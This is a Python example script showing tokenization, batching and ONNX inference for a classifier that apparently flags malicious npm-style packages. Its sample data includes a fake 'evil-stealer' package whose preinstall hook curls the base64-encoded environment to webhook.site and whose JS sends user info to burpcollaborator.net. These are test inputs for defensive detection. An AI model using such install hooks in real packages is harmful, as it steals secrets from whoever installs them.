"""
Minimal, self-contained example showing EXACTLY how the ModernBERT v2 tokenizer,
token batching, and ONNX Runtime inference work in PackGuard Stage 2.

Only requires:
    pip install onnxruntime tokenizers numpy
"""

import json
from pathlib import Path
from typing import Any, Dict, List, Tuple

import numpy as np
import onnxruntime as ort
from tokenizers import Tokenizer

from text_formatter import format_scanner_chunks_to_text

# ModernBERT special token IDs (from tokenizer_config.json / tokenizer.json)
PAD_TOKEN_ID = 50283
PAD_TOKEN = "[PAD]"
MAX_SEQ_LENGTH = 512
DEFAULT_THRESHOLD = 0.72


class SimpleStage2BatchPredictor:
    """
    Shows how to:
      1. Load `tokenizer.json` and configure truncation + batch padding
      2. Convert single or batched texts into `int64` `input_ids` and `attention_mask`
      3. Run `packguard_modernbert_v2_int8.onnx` (NOTE: ModernBERT does NOT use `token_type_ids`!)
      4. Convert output `logits` [batch_size, 2] -> malicious probabilities & verdicts
    """

    def __init__(self, model_dir: str = "./model_int8", max_length: int = MAX_SEQ_LENGTH):
        model_path = Path(model_dir)
        onnx_file = model_path / "packguard_modernbert_v2_int8.onnx"
        if not onnx_file.exists():
            onnx_file = model_path / "packguard_modernbert_int8.onnx"

        tokenizer_file = model_path / "tokenizer.json"

        # 1. Load fast Rust-backed tokenizer directly from tokenizer.json
        self.tokenizer = Tokenizer.from_file(str(tokenizer_file))
        self.tokenizer.enable_truncation(max_length=max_length)
        self.tokenizer.enable_padding(
            direction="right",
            pad_id=PAD_TOKEN_ID,
            pad_token=PAD_TOKEN,
            pad_to_multiple_of=8,
        )

        # 2. Load calibrated threshold (0.72 for v2)
        thresh_path = model_path / "best_threshold.json"
        if thresh_path.exists():
            self.threshold = float(json.loads(thresh_path.read_text())["threshold"])
        else:
            self.threshold = DEFAULT_THRESHOLD

        # 3. Create CPU ONNX Runtime session
        sess_opts = ort.SessionOptions()
        sess_opts.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL
        self.session = ort.InferenceSession(
            str(onnx_file),
            sess_options=sess_opts,
            providers=["CPUExecutionProvider"],
        )

    def tokenize_batch(self, texts: List[str]) -> Dict[str, np.ndarray]:
        """
        Tokenize and pad a batch of strings into 2D int64 numpy arrays:
          - input_ids:      shape [batch_size, seq_len], dtype int64
          - attention_mask: shape [batch_size, seq_len], dtype int64
        IMPORTANT: Do NOT pass `token_type_ids` to ModernBERT!
        """
        encodings = self.tokenizer.encode_batch(texts)
        input_ids = np.array([e.ids for e in encodings], dtype=np.int64)
        attention_mask = np.array([e.attention_mask for e in encodings], dtype=np.int64)
        return {
            "input_ids": input_ids,
            "attention_mask": attention_mask,
        }

    def predict_texts(self, texts: List[str], batch_size: int = 8) -> List[Tuple[bool, float]]:
        """Run batched ONNX inference on a list of formatted package texts."""
        results: List[Tuple[bool, float]] = []
        for start in range(0, len(texts), batch_size):
            batch_texts = texts[start : start + batch_size]
            ort_inputs = self.tokenize_batch(batch_texts)

            # ONNX output `logits` has shape [batch_size, 2]
            # Index 0 = benign logit, Index 1 = malicious logit
            logits = self.session.run(["logits"], ort_inputs)[0]

            # Numerically stable softmax across class dimension (axis = -1)
            shifted = logits - np.max(logits, axis=-1, keepdims=True)
            exp_scores = np.exp(shifted)
            probs = exp_scores / np.sum(exp_scores, axis=-1, keepdims=True)

            for mal_prob in probs[:, 1]:
                p = float(mal_prob)
                is_malicious = p >= self.threshold
                results.append((is_malicious, round(p, 4)))
        return results

    def predict_stage1_reports(
        self, reports: List[Dict[str, Any]], batch_size: int = 8
    ) -> List[Tuple[bool, float]]:
        """Format a list of Stage 1 JSON report dicts and score them in batches."""
        texts = [format_scanner_chunks_to_text(r) for r in reports]
        return self.predict_texts(texts, batch_size=batch_size)


if __name__ == "__main__":
    predictor = SimpleStage2BatchPredictor("./model_int8")

    sample_reports = [
        {
            "package": "clean-math@1.0.0",
            "chunks": [
                {
                    "file": "index.js",
                    "kind": "js",
                    "start": 0,
                    "text": "module.exports = (a, b) => a + b;\n",
                }
            ],
        },
        {
            "package": "evil-stealer@1.0.0",
            "chunks": [
                {
                    "file": "install_scripts.txt",
                    "kind": "script",
                    "start": 0,
                    "text": "preinstall: curl -s -X POST https://webhook.site/abc -d \"$(env | base64)\"",
                },
                {
                    "file": "index.js",
                    "kind": "js",
                    "start": 0,
                    "text": "const os = require('os'); const https = require('https');\nhttps.request({hostname: 'burpcollaborator.net', method: 'POST'}).end(JSON.stringify(os.userInfo()));",
                },
            ],
        },
    ]

    verdicts = predictor.predict_stage1_reports(sample_reports, batch_size=2)
    for rep, (flagged, prob) in zip(sample_reports, verdicts):
        label = "MALICIOUS" if flagged else "BENIGN"
        print(f"{rep['package']:<22} -> {label:<10} (prob={prob:.4f})")
